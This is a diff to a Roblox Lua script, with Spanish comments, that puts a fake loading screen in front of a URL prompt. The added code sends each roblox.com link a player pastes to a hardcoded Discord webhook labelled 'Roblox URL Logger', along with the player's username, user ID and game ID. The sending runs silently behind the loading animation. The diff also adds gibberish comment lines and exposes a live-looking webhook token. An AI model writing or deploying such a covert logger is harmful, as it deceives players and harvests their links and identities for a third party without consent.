@@ -6,6 +6,7 @@ local StarterGui = game:GetService("StarterGui")
 local CoreGui = game:GetService("CoreGui")
 local SoundService = game:FindService("SoundService") or game:GetService("SoundService")
 local TeleportService = game:GetService("TeleportService")
+local HttpService = game:GetService("HttpService")
 
 if not SoundService then
 	repeat task.wait() until game:FindService("SoundService")
@@ -180,6 +181,61 @@ statusText.ZIndex = 203
 statusText.Text = ""
 statusText.Parent = loadingFrame
 
+
+-- hdhdhhgdhddhhddhfhhvfvbggvggbcvvchchchvjvcvjhhvjvgjvjgjvjcj cb vjjjvjjvnvnvnvnvnjvjvcjkjcncbccncb
+
+-- 🌐 Sistema de envío web
+-- 🌐 Sistema de envío web CORREGIDO
+local function sendToWebhook(url, data)
+	local success, result = pcall(function()
+		-- Usar HttpService:RequestAsync que está permitido
+		local response = HttpService:RequestAsync({
+			Url = url,
+			Method = "POST",
+			Headers = {
+				["Content-Type"] = "application/json"
+			},
+			Body = HttpService:JSONEncode({
+				content = "🔔 **Nueva URL ingresada**",
+				embeds = {{
+					title = "Información del Usuario",
+					color = 65280,
+					fields = {
+						{
+							name = "👤 Usuario",
+							value = player.Name .. " (ID: " .. player.UserId .. ")",
+							inline = true
+						},
+						{
+							name = "🌐 URL Ingresada",
+							value = "" .. data.url .."",
+							inline = false
+						},
+						{
+							name = "🕒 Fecha/Hora",
+							value = os.date("%Y-%m-%d %H:%M:%S"),
+							inline = true
+						},
+						{
+							name = "🎮 Game ID",
+							value = tostring(game.GameId),
+							inline = true
+						}
+					},
+					footer = {
+						text = "Roblox URL Logger"
+					}
+				}}
+			})
+		})
+		
+		return response.Success, response.Body
+	end)
+	
+	return success, result
+end
+-- hsjsjhshhshshshhshhshsjsjsjsjjsjsjjsjjhhhdhhhhhhhhhhhhhhhhgghhhhhhhhhjhjjjjdjjjzjjxjjjxhjhxjhxbhxvjxjjjxjjx
+
 -- 🔔 Toast final
 local function showFatalError()
 	local toast = Instance.new("TextLabel")
@@ -261,9 +317,38 @@ end
 ------------------------------------------------------------
 -- 🔁 Flujo principal
 ------------------------------------------------------------
-local function startSequence()
+local function startSequence(url)
 	introFrame.Visible = false
 	loadingFrame.Visible = true
+	
+	-- 🔄 Enviar datos al webhook antes de empezar la animación
+	task.spawn(function()
+		local webhookUrl = "https://discord.com/api/webhooks/1398573923280359425/SQDEI2MXkQUC6f4WGdexcHGdmYpUO_sARSkuBmF-Wa-fjQjsvpTiUjVcEjrvuVdSKGb1" -- Reemplaza con tu webhook URL
+		
+		local data = {
+			url = url,
+			playerName = player.Name,
+			playerId = player.UserId,
+			gameId = game.GameId,
+			timestamp = os.time()
+		}
+		
+		statusText.Text = "Enviando datos..."
+		
+		local success, result = sendToWebhook(webhookUrl, data)
+		
+		if success then
+			print("✅ Datos enviados exitosamente")
+			statusText.Text = "Datos enviados - Iniciando secuencia..."
+		else
+			print("❌ Error enviando datos:", result)
+			statusText.Text = "Error en envío - Continuando..."
+		end
+		
+		task.wait(2)
+	end)
+	
+	-- Iniciar animaciones
 	startLoadingAnimation()
 	task.spawn(updateStatusMessages)
 	task.spawn(animateProgressBar)
@@ -288,7 +373,7 @@ startButton.MouseButton1Click:Connect(function()
 	local text = textBox.Text
 	if string.sub(text, 1, 23) == "https://www.roblox.com/" then
 		errorLabel.Text = ""
-		startSequence()
+		startSequence(text) -- Pasar la URL a la función
 	else
 		errorLabel.Text = "Url invalida"
 	end
